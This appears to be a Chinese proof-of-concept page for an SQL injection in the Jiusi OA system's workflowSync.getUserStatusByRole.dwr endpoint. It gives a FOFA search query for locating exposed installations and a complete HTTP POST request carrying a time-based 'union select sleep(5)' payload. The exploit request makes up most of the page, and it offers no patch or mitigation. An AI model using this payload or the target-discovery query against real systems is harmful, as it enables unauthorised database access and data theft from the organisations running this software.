# 九思OA系统workflowSync.getUserStatusByRole.dwr存在SQL注入

北京九思协同办公软件 `/jsoa/workflow/dwr/exec/workflowSync.getUserStatusByRole.dwr`接口处存在SQL注入漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息

## fofa

```javascript
app="九思软件-OA"
```

## poc

```javascript
POST /jsoa/workflow/dwr/exec/workflowSync.getUserStatusByRole.dwr HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Content-Type: application/x-www-form-urlencoded; charset=utf-8
Connection: close

callCount=1
c0-scriptName=workflowSync
c0-methodName=getUserStatusByRole
c0-id=1
c0-param0=string:1
c0-param1=string:1 union select 0,sleep(5)#
xml=true
```

![image-20241128095426150](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202411280954210.png)